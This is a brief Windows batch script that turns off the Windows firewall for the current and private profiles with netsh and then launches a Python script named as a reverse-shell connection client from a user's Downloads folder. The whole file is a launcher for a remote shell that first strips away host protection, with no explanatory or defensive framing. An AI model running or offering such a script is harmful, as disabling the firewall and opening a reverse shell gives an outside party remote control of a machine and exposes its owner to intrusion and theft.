cls
netsh advfirewall set currentprofile state off
netsh advfirewall set privateprofile state off
D:
cd D:\Users\ly*\Downloads\Shell_Reverse_Python\python
python.exe "Shell-reverse_connection-Python-client.py" %*
timeout /t 30